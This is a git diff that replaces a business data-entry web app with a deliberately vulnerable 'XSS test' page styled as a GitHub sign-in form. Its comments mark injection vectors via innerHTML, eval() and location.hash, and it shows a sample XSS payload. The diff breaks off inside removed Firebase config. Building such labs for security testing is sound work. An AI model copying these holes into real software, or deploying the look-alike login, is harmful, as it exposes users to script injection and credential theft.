@@ -1,2107 +1,273 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Entry Sheet Pro - Complete Business Solution</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background-color: #f5f7fa;
-            color: #333;
-            line-height: 1.6;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-            overflow: hidden;
-        }
-        
-        header {
-            background: linear-gradient(135deg, #2c3e50, #4a6491);
-            color: white;
-            padding: 25px 30px;
-            position: relative;
-        }
-        
-        .developer-badge {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-            backdrop-filter: blur(5px);
-        }
-        
-        h1 {
-            font-size: 28px;
-            margin-bottom: 8px;
-        }
-        
-        .subtitle {
-            font-size: 16px;
-            opacity: 0.85;
-            font-weight: 300;
-        }
-        
-        /* Auth Styles */
-        .auth-container {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .auth-box {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            width: 90%;
-            max-width: 400px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-        }
-        
-        .auth-tabs {
-            display: flex;
-            margin-bottom: 25px;
-            border-bottom: 2px solid #eaeef2;
-        }
-        
-        .auth-tab {
-            flex: 1;
-            padding: 12px;
-            text-align: center;
-            cursor: pointer;
-            font-weight: 600;
-            color: #7f8c8d;
-            border-bottom: 3px solid transparent;
-            transition: all 0.3s;
-        }
-        
-        .auth-tab.active {
-            color: #4a6491;
-            border-bottom-color: #4a6491;
-        }
-        
-        .auth-content {
-            display: none;
-        }
-        
-        .auth-content.active {
-            display: block;
-        }
-        
-        .user-info {
-            display: none;
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            backdrop-filter: blur(5px);
-        }
-        
-        /* Navigation Tabs */
-        .nav-tabs {
-            display: flex;
-            background: #f9fafc;
-            border-bottom: 1px solid #eaeef2;
-        }
-        
-        .nav-tab {
-            padding: 15px 25px;
-            cursor: pointer;
-            font-weight: 600;
-            color: #7f8c8d;
-            border-bottom: 3px solid transparent;
-            transition: all 0.3s;
-        }
-        
-        .nav-tab.active {
-            color: #4a6491;
-            border-bottom-color: #4a6491;
-            background: white;
-        }
-        
-        /* Tab Content */
-        .tab-content {
-            display: none;
-            padding: 25px;
-        }
-        
-        .tab-content.active {
-            display: block;
-        }
-        
-        .content-grid {
-            display: grid;
-            grid-template-columns: 1fr 2fr;
-            gap: 25px;
-        }
-        
-        @media (max-width: 1100px) {
-            .content-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-        
-        /* Data Entry Panel */
-        .data-entry-panel {
-            background-color: #f9fafc;
-            padding: 25px;
-            border-radius: 8px;
-            border: 1px solid #eaeef2;
-        }
-        
-        .panel-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .panel-actions {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #2c3e50;
-        }
-        
-        input, select {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #d1d9e6;
-            border-radius: 6px;
-            font-size: 15px;
-            transition: border-color 0.3s;
-        }
-        
-        input:focus, select:focus {
-            outline: none;
-            border-color: #4a6491;
-            box-shadow: 0 0 0 2px rgba(74, 100, 145, 0.2);
-        }
-        
-        /* Import CSV */
-        .import-container {
-            margin-top: 20px;
-            padding: 20px;
-            border: 2px dashed #d1d9e6;
-            border-radius: 8px;
-            text-align: center;
-        }
-        
-        .file-input-wrapper {
-            position: relative;
-            display: inline-block;
-        }
-        
-        .file-input-wrapper input[type="file"] {
-            position: absolute;
-            left: 0;
-            top: 0;
-            opacity: 0;
-            width: 100%;
-            height: 100%;
-            cursor: pointer;
-        }
-        
-        /* Advanced Filters */
-        .filters-container {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            border: 1px solid #eaeef2;
-            margin-bottom: 20px;
-        }
-        
-        .filter-group {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-            margin-bottom: 15px;
-        }
-        
-        .filter-item {
-            flex: 1;
-            min-width: 200px;
-        }
-        
-        .filter-item input, .filter-item select {
-            width: 100%;
-        }
-        
-        /* Charts Container */
-        .charts-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        
-        .chart-box {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            border: 1px solid #eaeef2;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
-        }
-        
-        .chart-title {
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            color: #2c3e50;
-        }
-        
-        .chart-canvas {
-            width: 100%;
-            height: 250px;
-        }
-        
-        /* Statistics */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-bottom: 25px;
-        }
-        
-        .stat-card {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            border: 1px solid #eaeef2;
-            text-align: center;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
-        }
-        
-        .stat-value {
-            font-size: 28px;
-            font-weight: 700;
-            color: #2c3e50;
-            margin-bottom: 5px;
-        }
-        
-        .stat-label {
-            color: #7f8c8d;
-            font-size: 14px;
-        }
-        
-        .stat-trend {
-            font-size: 12px;
-            margin-top: 5px;
-        }
-        
-        .trend-up {
-            color: #27ae60;
-        }
-        
-        .trend-down {
-            color: #e74c3c;
-        }
-        
-        /* Data Table */
-        .table-container {
-            background: white;
-            border-radius: 8px;
-            border: 1px solid #eaeef2;
-            overflow: hidden;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
-        }
-        
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-        
-        th {
-            background-color: #4a6491;
-            color: white;
-            padding: 15px;
-            text-align: left;
-            font-weight: 600;
-            cursor: pointer;
-            user-select: none;
-        }
-        
-        th:hover {
-            background-color: #3a5481;
-        }
-        
-        td {
-            padding: 15px;
-            border-bottom: 1px solid #eaeef2;
-        }
-        
-        tr:hover {
-            background-color: #f5f9ff;
-        }
-        
-        /* Buttons */
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            background: #4a6491;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
-            transition: all 0.3s;
-        }
-        
-        .btn:hover {
-            background: #3a5481;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        
-        .btn-sm {
-            padding: 6px 12px;
-            font-size: 13px;
-        }
-        
-        .btn-primary {
-            background: #4a6491;
-        }
-        
-        .btn-success {
-            background: #27ae60;
-        }
-        
-        .btn-success:hover {
-            background: #219653;
-        }
-        
-        .btn-warning {
-            background: #f39c12;
-        }
-        
-        .btn-warning:hover {
-            background: #e67e22;
-        }
-        
-        .btn-danger {
-            background: #e74c3c;
-        }
-        
-        .btn-danger:hover {
-            background: #c0392b;
-        }
-        
-        .btn-info {
-            background: #3498db;
-        }
-        
-        .btn-info:hover {
-            background: #2980b9;
-        }
-        
-        /* Notifications */
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 20px;
-            border-radius: 6px;
-            color: white;
-            font-weight: 600;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            z-index: 1000;
-            opacity: 0;
-            transform: translateY(-20px);
-            transition: opacity 0.3s, transform 0.3s;
-        }
-        
-        .notification.show {
-            opacity: 1;
-            transform: translateY(0);
-        }
-        
-        .notification-success {
-            background-color: #27ae60;
-        }
-        
-        .notification-warning {
-            background-color: #f39c12;
-        }
-        
-        .notification-error {
-            background-color: #e74c3c;
-        }
-        
-        .notification-info {
-            background-color: #3498db;
-        }
-        
-        /* Export Controls */
-        .export-controls {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin-top: 20px;
-            padding: 20px;
-            background: #f9fafc;
-            border-radius: 8px;
-        }
-        
-        /* Footer */
-        footer {
-            text-align: center;
-            padding: 20px;
-            color: #7f8c8d;
-            font-size: 14px;
-            border-top: 1px solid #eaeef2;
-            margin-top: 20px;
-        }
-        
-        .footer-credit {
-            text-align: center;
-            margin-top: 10px;
-            color: #4a6491;
-            font-weight: 600;
-        }
-        
-        .footer-credit span {
-            color: #e74c3c;
-        }
-        
-        /* Loading Spinner */
-        .loading {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.8);
-            z-index: 3000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #4a6491;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <!-- Chart.js -->
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <!-- Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GitHub login · XSS testing</title>
+  <!-- Tailwind via CDN (v3) -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Inter font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Inter', sans-serif; }
+    .focus-ring:focus {
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(9, 105, 218, 0.3);
+      border-color: #0969da;
+    }
+    .xss-output {
+      word-break: break-all;
+    }
+  </style>
 </head>
-<body>
-    <!-- Loading Spinner -->
-    <div class="loading" id="loadingSpinner">
-        <div class="spinner"></div>
-    </div>
+<body class="bg-[#f6f8fa] min-h-screen flex flex-col items-center justify-start px-6 pt-12 pb-20">
+
+  <!-- XSS TEST NOTICE - DELIBERATELY VULNERABLE -->
+  <div class="w-full max-w-[340px] mb-4 p-3 bg-yellow-50 border border-yellow-300 rounded-md text-sm text-yellow-800">
+    <strong>⚠️ XSS TEST ENVIRONMENT</strong><br>
+    Try: <code>&lt;img src=x onerror=alert('XSS')&gt;</code> in fields below
+  </div>
+
+  <!-- GitHub logo -->
+  <div class="mb-6">
+    <svg height="48" viewBox="0 0 24 24" width="48" class="fill-[#1f2328]">
+      <path d="M12.5.75C6.146.75.75 6.146.75 12.5c0 5.063 3.29 9.36 7.84 10.86.575.106.79-.25.79-.553 0-.276-.01-1.2-.015-2.18-3.188.693-3.86-1.537-3.86-1.537-.52-1.326-1.27-1.68-1.27-1.68-1.04-.712.08-.697.08-.697 1.15.082 1.755 1.182 1.755 1.182 1.02 1.753 2.68 1.247 3.335.954.104-.74.4-1.247.727-1.534-2.55-.29-5.23-1.275-5.23-5.673 0-1.254.45-2.28 1.184-3.084-.12-.29-.514-1.46.112-3.04 0 0 .965-.31 3.162 1.18.92-.256 1.906-.384 2.885-.39.98.006 1.966.134 2.887.39 2.196-1.49 3.16-1.18 3.16-1.18.627 1.58.233 2.75.113 3.04.735.804 1.184 1.83 1.184 3.084 0 4.41-2.685 5.38-5.24 5.66.412.357.78 1.06.78 2.137 0 1.545-.015 2.79-.015 3.17 0 .306.213.664.8.55 4.547-1.503 7.833-5.8 7.833-10.86 0-6.354-5.396-11.75-11.75-11.75Z"></path>
+    </svg>
+  </div>
+
+  <!-- MAIN LOGIN CARD - VULNERABLE TO XSS -->
+  <div class="w-full max-w-[340px] bg-white rounded-md border border-[#d0d7de] p-4 sm:p-5 md:p-6 shadow-[0_4px_12px_rgba(0,0,0,0.15)]">
     
-    <!-- Authentication Modal -->
-    <div class="auth-container" id="authContainer">
-        <div class="auth-box">
-            <div class="auth-tabs">
-                <div class="auth-tab active" data-tab="login">Login</div>
-                <div class="auth-tab" data-tab="register">Register</div>
-            </div>
-            
-            <div class="auth-content active" id="loginContent">
-                <h3>Login to Your Account</h3>
-                <div class="form-group">
-                    <label for="loginEmail">Email</label>
-                    <input type="email" id="loginEmail" placeholder="Enter your email">
-                </div>
-                <div class="form-group">
-                    <label for="loginPassword">Password</label>
-                    <input type="password" id="loginPassword" placeholder="Enter your password">
-                </div>
-                <button class="btn btn-primary" id="loginBtn" style="width: 100%;">
-                    <i class="fas fa-sign-in-alt"></i> Login
-                </button>
-                <div class="form-group" style="text-align: center; margin-top: 15px;">
-                    <small>Demo: test@example.com / password123</small>
-                </div>
-            </div>
-            
-            <div class="auth-content" id="registerContent">
-                <h3>Create New Account</h3>
-                <div class="form-group">
-                    <label for="registerName">Full Name</label>
-                    <input type="text" id="registerName" placeholder="Enter your name">
-                </div>
-                <div class="form-group">
-                    <label for="registerEmail">Email</label>
-                    <input type="email" id="registerEmail" placeholder="Enter your email">
-                </div>
-                <div class="form-group">
-                    <label for="registerPassword">Password</label>
-                    <input type="password" id="registerPassword" placeholder="Create a password (min 6 chars)">
-                </div>
-                <button class="btn btn-success" id="registerBtn" style="width: 100%;">
-                    <i class="fas fa-user-plus"></i> Register
-                </button>
-            </div>
+    <h1 class="text-[24px] leading-[1.4] font-light text-[#1f2328] mb-4 text-center">Sign in to GitHub</h1>
+
+    <!-- VULNERABLE FORM #1: Direct DOM injection with innerHTML -->
+    <form id="xssForm" action="javascript:void(0)" method="post" class="space-y-4" onsubmit="vulnLogin()">
+      
+      <!-- XSS VECTOR 1: username field - injects via innerHTML -->
+      <div>
+        <label for="login_field" class="block text-[14px] font-medium text-[#1f2328] mb-1.5">
+          Username or email address
+        </label>
+        <input type="text" id="login_field" name="login" 
+               class="block w-full px-3 py-2 border border-[#d0d7de] rounded-md text-[14px] focus-ring"
+               placeholder="Try <img src=x onerror=alert('XSS')>" 
+               value="">
+        <p class="text-xs text-gray-500 mt-1">Vulnerable to stored/reflected XSS</p>
+      </div>
+
+      <!-- XSS VECTOR 2: password field with eval() vulnerability -->
+      <div>
+        <div class="flex justify-between items-center mb-1.5">
+          <label for="password_field" class="text-[14px] font-medium text-[#1f2328]">
+            Password
+          </label>
+          <a href="#" onclick="showForgotMessage()" class="text-[12px] text-[#0969da] no-underline hover:underline">
+            Forgot password?
+          </a>
         </div>
-    </div>
-    
-    <!-- Main Container -->
-    <div class="container">
-        <header>
-            <div class="user-info" id="userInfo">
-                <i class="fas fa-user"></i> <span id="userName">Guest</span>
-                <button class="btn btn-sm btn-danger" id="logoutBtn" style="margin-left: 10px;">
-                    <i class="fas fa-sign-out-alt"></i>
-                </button>
-            </div>
-            <div class="developer-badge">Developed by <span style="color: #ffd700;">ZABTUS</span></div>
-            <h1>Data Entry Sheet Pro</h1>
-            <p class="subtitle">Complete business solution with user accounts, analytics, and cloud sync</p>
-        </header>
-        
-        <!-- Navigation Tabs -->
-        <div class="nav-tabs">
-            <div class="nav-tab active" data-tab="dashboard">
-                <i class="fas fa-tachometer-alt"></i> Dashboard
-            </div>
-            <div class="nav-tab" data-tab="dataEntry">
-                <i class="fas fa-plus-circle"></i> Data Entry
-            </div>
-            <div class="nav-tab" data-tab="analytics">
-                <i class="fas fa-chart-bar"></i> Analytics
-            </div>
-            <div class="nav-tab" data-tab="import">
-                <i class="fas fa-file-import"></i> Import Data
-            </div>
-        </div>
-        
-        <!-- Dashboard Tab -->
-        <div class="tab-content active" id="dashboardTab">
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-value" id="totalEntries">0</div>
-                    <div class="stat-label">Total Entries</div>
-                    <div class="stat-trend trend-up" id="entriesTrend">+0 this week</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value" id="totalValue">$0.00</div>
-                    <div class="stat-label">Total Value</div>
-                    <div class="stat-trend trend-up" id="valueTrend">+$0 this week</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value" id="activeEntries">0</div>
-                    <div class="stat-label">Active Entries</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value" id="categoriesCount">0</div>
-                    <div class="stat-label">Categories</div>
-                </div>
-            </div>
-            
-            <div class="charts-container">
-                <div class="chart-box">
-                    <div class="chart-title">Category Distribution</div>
-                    <canvas class="chart-canvas" id="categoryChart"></canvas>
-                </div>
-                <div class="chart-box">
-                    <div class="chart-title">Monthly Trend</div>
-                    <canvas class="chart-canvas" id="monthlyChart"></canvas>
-                </div>
-                <div class="chart-box">
-                    <div class="chart-title">Status Overview</div>
-                    <canvas class="chart-canvas" id="statusChart"></canvas>
-                </div>
-                <div class="chart-box">
-                    <div class="chart-title">Value Range Distribution</div>
-                    <canvas class="chart-canvas" id="valueChart"></canvas>
-                </div>
-            </div>
-            
-            <div class="filters-container">
-                <h3 style="margin-bottom: 15px;">Advanced Filters</h3>
-                <div class="filter-group">
-                    <div class="filter-item">
-                        <label>Category</label>
-                        <select id="filterCategory">
-                            <option value="">All Categories</option>
-                        </select>
-                    </div>
-                    <div class="filter-item">
-                        <label>Status</label>
-                        <select id="filterStatus">
-                            <option value="">All Status</option>
-                            <option value="Active">Active</option>
-                            <option value="Pending">Pending</option>
-                            <option value="Completed">Completed</option>
-                            <option value="Cancelled">Cancelled</option>
-                        </select>
-                    </div>
-                    <div class="filter-item">
-                        <label>Date From</label>
-                        <input type="date" id="filterDateFrom">
-                    </div>
-                    <div class="filter-item">
-                        <label>Date To</label>
-                        <input type="date" id="filterDateTo">
-                    </div>
-                </div>
-                <div class="filter-group">
-                    <div class="filter-item">
-                        <label>Min Value</label>
-                        <input type="number" id="filterMinValue" placeholder="Min value">
-                    </div>
-                    <div class="filter-item">
-                        <label>Max Value</label>
-                        <input type="number" id="filterMaxValue" placeholder="Max value">
-                    </div>
-                    <div class="filter-item">
-                        <label>Search Name</label>
-                        <input type="text" id="filterSearch" placeholder="Search in names">
-                    </div>
-                    <div class="filter-item">
-                        <label style="visibility: hidden;">Apply</label>
-                        <button class="btn btn-primary" id="applyFilters">
-                            <i class="fas fa-filter"></i> Apply Filters
-                        </button>
-                        <button class="btn btn-reset" id="clearFilters" style="margin-left: 10px;">
-                            <i class="fas fa-times"></i> Clear
-                        </button>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="table-container">
-                <div style="padding: 15px; background: #f9fafc; border-bottom: 1px solid #eaeef2;">
-                    <strong>Filtered Results:</strong> <span id="filterCount">0</span> entries found
-                </div>
-                <table id="dataTable">
-                    <thead>
-                        <tr>
-                            <th data-sort="name">Name <span class="sort-indicator">▼</span></th>
-                            <th data-sort="category">Category</th>
-                            <th data-sort="value">Value</th>
-                            <th data-sort="date">Date</th>
-                            <th data-sort="status">Status</th>
-                            <th>Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody id="tableBody">
-                        <tr class="empty-row">
-                            <td colspan="6" class="empty-message">No data entered yet. Start by adding your first entry.</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-            
-            <div class="export-controls">
-                <button class="btn btn-download" id="downloadBtn">
-                    <i class="fas fa-download"></i> Download Data
-                </button>
-                <button class="btn btn-info" id="quickCSVBtn">
-                    <i class="fas fa-file-csv"></i> Export CSV
-                </button>
-                <button class="btn btn-success" id="quickExcelBtn">
-                    <i class="fas fa-file-excel"></i> Export Excel
-                </button>
-                <button class="btn btn-warning" id="exportJSONBtn">
-                    <i class="fas fa-code"></i> Export JSON
-                </button>
-                <button class="btn btn-danger" id="exportPDFBtn">
-                    <i class="fas fa-file-pdf"></i> Export PDF
-                </button>
-            </div>
-        </div>
-        
-        <!-- Data Entry Tab -->
-        <div class="tab-content" id="dataEntryTab">
-            <div class="content-grid">
-                <div class="data-entry-panel">
-                    <div class="panel-header">
-                        <h3>Add New Entry</h3>
-                        <div class="panel-actions">
-                            <button class="btn btn-sm btn-reset" id="resetFormBtn">
-                                <i class="fas fa-redo"></i> Reset
-                            </button>
-                        </div>
-                    </div>
-                    
-                    <form id="dataForm">
-                        <div class="form-group">
-                            <label for="entryName">Item Name *</label>
-                            <input type="text" id="entryName" required placeholder="Enter item or customer name">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="entryCategory">Category</label>
-                            <div style="display: flex; gap: 10px;">
-                                <input type="text" id="entryCategory" list="categoryList" placeholder="Enter or select category">
-                                <button type="button" class="btn btn-sm btn-info" id="addCategoryBtn">
-                                    <i class="fas fa-plus"></i>
-                                </button>
-                            </div>
-                            <datalist id="categoryList"></datalist>
-                            <div id="categorySuggestions" style="margin-top: 10px;"></div>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="entryValue">Value ($)</label>
-                            <input type="number" id="entryValue" step="0.01" placeholder="Enter numeric value">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="entryDate">Date</label>
-                            <input type="date" id="entryDate">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="entryStatus">Status</label>
-                            <select id="entryStatus">
-                                <option value="Active">Active</option>
-                                <option value="Pending">Pending</option>
-                                <option value="Completed">Completed</option>
-                                <option value="Cancelled">Cancelled</option>
-                            </select>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="entryNotes">Notes (Optional)</label>
-                            <textarea id="entryNotes" rows="3" placeholder="Additional notes" style="width: 100%; padding: 12px 15px; border: 1px solid #d1d9e6; border-radius: 6px; font-size: 15px;"></textarea>
-                        </div>
-                        
-                        <button type="submit" class="btn btn-primary" style="width: 100%;">
-                            <i class="fas fa-plus-circle"></i> Add Entry
-                        </button>
-                    </form>
-                    
-                    <div class="warning-box" style="margin-top: 20px;">
-                        <p><strong>⚠️ Important:</strong> Data is stored in Firebase cloud. Export regularly for additional backup.</p>
-                    </div>
-                </div>
-                
-                <div>
-                    <div class="table-container">
-                        <div style="padding: 15px; background: #f9fafc; border-bottom: 1px solid #eaeef2;">
-                            <strong>Recent Entries</strong>
-                        </div>
-                        <table id="recentTable">
-                            <thead>
-                                <tr>
-                                    <th>Name</th>
-                                    <th>Category</th>
-                                    <th>Value</th>
-                                    <th>Date</th>
-                                    <th>Status</th>
-                                </tr>
-                            </thead>
-                            <tbody id="recentTableBody">
-                                <tr>
-                                    <td colspan="5" class="empty-message">No recent entries</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Analytics Tab -->
-        <div class="tab-content" id="analyticsTab">
-            <div class="charts-container">
-                <div class="chart-box">
-                    <div class="chart-title">Category Value Distribution</div>
-                    <canvas class="chart-canvas" id="categoryValueChart"></canvas>
-                </div>
-                <div class="chart-box">
-                    <div class="chart-title">Status Value Comparison</div>
-                    <canvas class="chart-canvas" id="statusValueChart"></canvas>
-                </div>
-                <div class="chart-box">
-                    <div class="chart-title">Daily Entries Trend</div>
-                    <canvas class="chart-canvas" id="dailyChart"></canvas>
-                </div>
-                <div class="chart-box">
-                    <div class="chart-title">Top 10 Items by Value</div>
-                    <canvas class="chart-canvas" id="topItemsChart"></canvas>
-                </div>
-            </div>
-            
-            <div class="table-container" style="margin-top: 30px;">
-                <div style="padding: 15px; background: #f9fafc; border-bottom: 1px solid #eaeef2;">
-                    <strong>Detailed Analytics</strong>
-                </div>
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Metric</th>
-                            <th>Value</th>
-                            <th>Change</th>
-                            <th>Trend</th>
-                        </tr>
-                    </thead>
-                    <tbody id="analyticsTableBody">
-                        <tr>
-                            <td>Average Entry Value</td>
-                            <td id="avgValue">$0.00</td>
-                            <td>0%</td>
-                            <td><span class="trend-neutral">-</span></td>
-                        </tr>
-                        <tr>
-                            <td>Most Active Category</td>
-                            <td id="topCategory">-</td>
-                            <td>-</td>
-                            <td>-</td>
-                        </tr>
-                        <tr>
-                            <td>Completion Rate</td>
-                            <td id="completionRate">0%</td>
-                            <td>0%</td>
-                            <td><span class="trend-neutral">-</span></td>
-                        </tr>
-                        <tr>
-                            <td>Entries This Month</td>
-                            <td id="monthlyEntries">0</td>
-                            <td>0%</td>
-                            <td><span class="trend-neutral">-</span></td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-        
-        <!-- Import Tab -->
-        <div class="tab-content" id="importTab">
-            <div class="content-grid">
-                <div class="data-entry-panel">
-                    <h3>Import Data from CSV</h3>
-                    <p style="margin-bottom: 20px; color: #7f8c8d;">
-                        Upload a CSV file to import data. File should have columns: Name, Category, Value, Date, Status
-                    </p>
-                    
-                    <div class="import-container">
-                        <i class="fas fa-file-csv" style="font-size: 48px; color: #4a6491; margin-bottom: 15px;"></i>
-                        <h4>Drag & Drop CSV File</h4>
-                        <p style="margin-bottom: 15px;">or</p>
-                        <div class="file-input-wrapper">
-                            <button class="btn btn-primary">
-                                <i class="fas fa-upload"></i> Choose File
-                            </button>
-                            <input type="file" id="csvFileInput" accept=".csv">
-                        </div>
-                        <p id="selectedFileName" style="margin-top: 10px; font-style: italic;"></p>
-                    </div>
-                    
-                    <div class="form-group" style="margin-top: 20px;">
-                        <label for="importStrategy">Import Strategy</label>
-                        <select id="importStrategy">
-                            <option value="add">Add new entries only</option>
-                            <option value="replace">Replace all existing data</option>
-                            <option value="merge">Merge with existing data</option>
-                        </select>
-                    </div>
-                    
-                    <button class="btn btn-success" id="importBtn" style="width: 100%;" disabled>
-                        <i class="fas fa-file-import"></i> Import Data
-                    </button>
-                    
-                    <div class="warning-box" style="margin-top: 20px;">
-                        <p><strong>⚠️ CSV Format Required:</strong></p>
-                        <p>• First row should be headers: Name,Category,Value,Date,Status</p>
-                        <p>• Date format: YYYY-MM-DD</p>
-                        <p>• Value should be numbers only</p>
-                    </div>
-                </div>
-                
-                <div>
-                    <div class="table-container">
-                        <div style="padding: 15px; background: #f9fafc; border-bottom: 1px solid #eaeef2;">
-                            <strong>Preview (First 5 rows)</strong>
-                        </div>
-                        <table id="previewTable">
-                            <thead>
-                                <tr>
-                                    <th>Name</th>
-                                    <th>Category</th>
-                                    <th>Value</th>
-                                    <th>Date</th>
-                                    <th>Status</th>
-                                </tr>
-                            </thead>
-                            <tbody id="previewTableBody">
-                                <tr>
-                                    <td colspan="5" class="empty-message">No file selected</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-                    
-                    <div class="import-stats" style="margin-top: 20px; padding: 20px; background: #f9fafc; border-radius: 8px;">
-                        <h4>Import Statistics</h4>
-                        <div id="importStats">
-                            <p>Rows to import: <span id="importRowCount">0</span></p>
-                            <p>Valid rows: <span id="importValidRows">0</span></p>
-                            <p>Invalid rows: <span id="importInvalidRows">0</span></p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <footer>
-            <p>Data Entry Sheet Pro &copy; 2026 | Cloud-powered business solution</p>
-            <p class="footer-credit">Project Developed by <span>ZABTUS</span></p>
-            <p style="margin-top: 10px; font-size: 12px;">
-                <span id="syncStatus">Offline Mode</span> | 
-                <span id="dataCount">0 entries</span>
-            </p>
-        </footer>
+        <input type="text" id="password_field" name="password" 
+               class="block w-full px-3 py-2 border border-[#d0d7de] rounded-md text-[14px] focus-ring"
+               placeholder="Password field also vulnerable"
+               value="">
+      </div>
+
+      <!-- Sign in button triggers XSS -->
+      <button type="submit" 
+              class="mt-1 w-full py-2 px-3 bg-[#1f883d] text-white text-[14px] font-semibold rounded-md">
+        Sign in (XSS enabled)
+      </button>
+    </form>
+
+    <!-- XSS VECTOR 3: DOM-based XSS via URL hash -->
+    <div class="mt-4 text-center border-t border-[#d0d7de] pt-4">
+      <button onclick="showHashXSS()" class="text-[14px] text-[#0969da] bg-transparent inline-flex items-center gap-1 hover:underline">
+        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" width="16" class="fill-current mr-1">
+          <path d="M10.5 4.5a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0Z"></path>
+          <path d="M8 8a5 5 0 0 0-4.546 2.917.714.714 0 0 0 .062.715A7.484 7.484 0 0 0 8 14c1.56 0 3.008-.477 4.21-1.292.28-.19.357-.558.147-.801A6.47 6.47 0 0 0 8 8Z"></path>
+        </svg>
+        Show URL hash (XSS via location.hash)
+      </button>
     </div>
 
-    <script>
-        // Firebase Configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyAUYpSMZmt_Mnky9SdirVSiXBqB7yB0aSI",
-            authDomain: "data-entry-sheet-pro.firebaseapp.com",
-            projectId: "data-entry-sheet-pro",
-            storageBucket: "data-entry-sheet-pro.firebasestorage.app",
-            messagingSenderId: "768133753576",
